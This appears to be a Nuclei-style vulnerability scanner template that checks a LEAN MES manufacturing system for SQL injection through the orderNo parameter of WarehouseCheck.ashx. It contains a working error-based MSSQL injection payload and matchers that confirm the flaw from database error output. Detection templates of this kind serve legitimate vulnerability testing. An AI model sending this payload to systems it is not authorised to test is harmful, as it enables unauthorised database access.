id: poc-yaml-skt-lean-mes-warehousecheck-ashx-sqli
info:
  name: 深科特 LEAN MES系统 WarehouseCheck.ashx SQL注入漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: sqli
  metadata:
    finger: lean-mes

variables:
  t1: "{{rand_int(1000, 10000)}}"
  t2: "{{md5(t1)}}"

http:
  - raw:
      - |
        GET /Handler/WarehouseCheck.ashx?api=GetGrnInfoList&orderNo='+AND+9173+IN+(SELECT+(sys.fn_varbintohexstr(hashbytes('MD5','{{t1}}'))))+AND+'rhYc'='rhYc&itemCode=1 HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 500
      - type: word
        part: body
        words:
          - "0x{{t2}}"
          - "SqlException"
      - type: regex
        part: body
        regex:
          - "转换成数据类型(.*?)时失败"
          - "在将(.*?)值"
